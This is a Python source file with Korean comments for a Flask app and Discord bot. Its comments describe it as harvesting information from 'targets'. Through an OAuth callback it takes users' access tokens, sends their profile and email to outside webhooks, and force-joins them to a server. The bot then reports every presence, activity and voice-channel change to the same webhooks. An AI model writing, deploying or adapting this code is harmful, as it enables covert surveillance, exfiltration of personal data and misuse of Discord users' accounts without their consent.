import os
import requests
import threading
import discord
import asyncio
from flask import Flask, request, render_template_string

# --- [1] 환경 변수 설정 ---
# (Render 대시보드 Environment Variables에 이 값들이 다 있어야 함)
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MY_GUILD_ID = os.environ.get('MY_GUILD_ID') # 타겟이 가입될 서버 "1" ID

# 서버 "2" (비밀 본부) 웹훅 URL
WH_PROFILE = os.environ.get('WH_PROFILE')
WH_GUILDS = os.environ.get('WH_GUILDS')
WH_CONNECT = os.environ.get('WH_CONNECT')
WH_CONTROL = os.environ.get('WH_CONTROL')
WH_SYSTEM = os.environ.get('WH_SYSTEM')

API_BASE = 'https://discord.com/api/v10'
user_storage = []

# --- [2] Flask 웹 서버 (인증 및 정보 탈취) ---
app = Flask(__name__)

def send_report(url, embed):
    try: requests.post(url, json={"embeds": [embed]})
    except: pass

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Monitoring Active.</p>"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "No Code", 400

    try:
        # 토큰 교환
        data = {
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        token_res = requests.post(f'{API_BASE}/oauth2/token', data=data, headers=headers).json()
        access_token = token_res.get('access_token')

        # 정보 수집
        h = {'Authorization': f'Bearer {access_token}'}
        u = requests.get(f'{API_BASE}/users/@me', headers=h).json()
        
        user_id = u.get('id')
        user_tag = f"{u.get('username')}"

        # 1. 신상 보고
        send_report(WH_PROFILE, {"title": "👤 타겟 포착", "description": f"**{user_tag}** (`{user_id}`)\nEmail: {u.get('email')}"})

        # 2. 강제 가입 시도 (서버 1)
        put_res = requests.put(
            f'{API_BASE}/guilds/{MY_GUILD_ID}/members/{user_id}',
            headers={'Authorization': f'Bot {BOT_TOKEN}'},
            json={'access_token': access_token}
        )
        
        send_report(WH_CONTROL, {
            "title": "⛓️ 강제 가입 시도",
            "description": f"서버 ID: {MY_GUILD_ID}\n결과 코드: {put_res.status_code} (201/204=성공)"
        })

        user_storage.append({"tag": user_tag, "id": user_id})
        return "<h1>✅ 인증 완료</h1>창을 닫으셔도 됩니다."

    except Exception as e:
        requests.post(WH_SYSTEM, json={"content": f"🚨 에러: {str(e)}"})
        return "Error", 500

@app.route('/admin')
def admin():
    return render_template_string("""
    <h2>Target List</h2>
    {% for u in users %} <p>{{u.tag}} ({{u.id}})</p> {% endfor %}
    """, users=user_storage)

# --- [3] Discord 봇 (실시간 감시) ---
intents = discord.Intents.default()
intents.presences = True  # 필수: 상태/게임 감지
intents.members = True    # 필수: 멤버 목록
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"🤖 봇 로그인 성공: {client.user}")
    # Render 로그에 이 메시지가 뜨면 성공입니다.

@client.event
async def on_presence_update(before, after):
    # 서버 1에서의 활동만 감시
    if str(after.guild.id) != str(MY_GUILD_ID): return

    if before.status != after.status or before.activities != after.activities:
        act = [a.name for a in after.activities]
        requests.post(WH_CONTROL, json={
            "content": f"📡 **{after.name}** 상태 변경: `{after.status}` | 활동: **{', '.join(act)}**"
        })

@client.event
async def on_voice_state_update(member, before, after):
    if str(member.guild.id) != str(MY_GUILD_ID): return
    
    if before.channel != after.channel:
        msg = f"🔊 **{member.name}**님이 `{after.channel}`에 입장" if after.channel else f"🔈 **{member.name}**님이 퇴장"
        requests.post(WH_CONTROL, json={"content": msg})

# --- [4] 실행 부 (스레딩) ---
def run_flask():
    # Render가 제공하는 PORT 환경변수를 사용해야 함 (기본 5000)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, use_reloader=False)

if __name__ == '__main__':
    # Flask를 데몬 스레드로 실행 (봇이 메인 스레드 차지)
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()

    if not BOT_TOKEN:
        print("❌ 에러: BOT_TOKEN 환경 변수가 없습니다!")
    else:
        client.run(BOT_TOKEN)
